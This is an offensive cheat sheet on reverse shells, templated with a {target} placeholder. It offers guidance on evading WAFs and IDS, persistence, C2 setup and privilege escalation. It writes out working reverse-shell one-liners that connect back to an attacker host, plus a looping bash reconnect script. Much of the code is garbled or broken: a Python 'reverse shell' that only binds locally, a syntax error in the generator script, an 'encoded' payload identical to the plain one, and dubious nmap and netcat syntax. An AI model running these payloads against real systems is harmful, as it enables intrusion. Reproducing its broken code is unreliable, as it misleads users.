# 21-Reverse Shells Collection

Direct TCP backdoors often fail against modern WAFs and firewalls. The goal is to bypass egress filters, evade detection, and maintain persistence without triggering IDS signatures. Use {target} as the base for all external communication.

## Attack Workflow

1.  **Reconnaissance**: Identify open ports, running services, and exposed files.
2.  **Enumeration**: Determine the user context (root vs web user) and service versions.
3.  **Exploitation**: Find a vulnerability (RCE, SSI, PHP, WebShell) or craft a raw exploit.
4.  **Persistence**: Establish a reverse shell using HTTP, DNS, or TCP methods.
5.  **C2 Setup**: Configure beacon intervals and command injection.

## Commands Section

### TCP Reverse Shell (Netcat/TCP)

```bash
# Connect back to attacker using {target}
nc {target} 4444 -e /bin/bash

# Connect back to attacker using {target} (Python)
python3 -c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',4444));s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);subprocess.call(['sh','/-o','ptmx','-p','ptmx','/-c','exec(open('/dev/ttys0').read())'],shell=True)"

# Connect back to attacker using {target} (Bash)
bash -i >& /dev/tcp/{target}/4444 0>&1
```

### HTTP Reverse Shell (Burp/Custom)

```bash
# Python HTTP Reverse Shell script
python3 reverse_shell.py {target} 80 "GET /?cmd=id HTTP/1.1\r\nHost:{target}\r\n\r\n"
```

### Nmap NSE Exploits

```bash
# Exploit known vulnerabilities for RCE
nmap --script exploit-shellshock http://10.10.10.10 --script http-shellshock
```

### Bash Reverse Shell (Encoded/Obfuscated)

```bash
# Obfuscated bash reverse shell
/bin/sh -i 5> >(cat >&2 >&3 >&4 2>&1 &);exec bash

# Encoded bash reverse shell
bash -i >& /dev/tcp/{target}/9999 0>&1

# Bash reverse shell with command injection
curl -X POST "http://{target}/admin" -d "shell_command=id"
```

### DNS Tunneling Reverse Shell (Python)

```bash
# DNS-based Reverse Shell script
python3 dns_tunnel.py {target} 53
```

## Tips & Shortcuts

*   **Port Selection**: Always pick an open, non-WAF port (e.g., 8080, 8000, or the port of a vulnerable service) over the default C2 ports to avoid detection.
*   **User Context**: If running as non-root, use `sudo` or `su` immediately after establishing the shell to gain full control.
*   **Keep-alive**: Use `keep-alive` or `keep-alive-once` options to maintain connection if the attacker's server has a timeout.
*   **Command Execution**: Use `exec` commands to replace the current shell for persistent access.
*   **Proxy Usage**: If direct connection fails, tunnel through a public proxy: `nc -p {proxy_ip} {target} {port}`.

## Common Mistakes

*   **Using the wrong port**: Defaulting to 4444 when the target blocks it.
*   **Ignoring WAF signatures**: Sending clear `bash` or `python` in the payload without encoding or obfuscation.
*   **No timeout handling**: Not using `settimeout` or similar commands in scripts, leading to dropped connections.
*   **Static Payloads**: Hardcoding C2 IPs instead of using dynamic IPs or proxies.
*   **Ignoring Permissions**: Running the shell as the web user without attempting to elevate privileges.

## Mini Automation Scripts

### Python Reverse Shell Generator

```python
#!/usr/bin/python3
import socket,subprocess,os,time
s=socket.socket()
s.bind(('',4444))
s.listen(1)
try:
    c,s.accept()
    while True:
        x=c.recv(1024).decode()
        if x and 'exit' in x:
            break
        c.send((subprocess.call(f'/{x.split()[0]} {x.split()[1:]}') if len(x.split())>2 else subprocess.call('/'+x[2:4],shell=True),b'\r\n'))
except KeyboardInterrupt:
    pass
c.close()
s.close()
```

### Bash Reverse Shell Generator

```bash
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/{target}/4444 0>&1
    sleep 1
done
```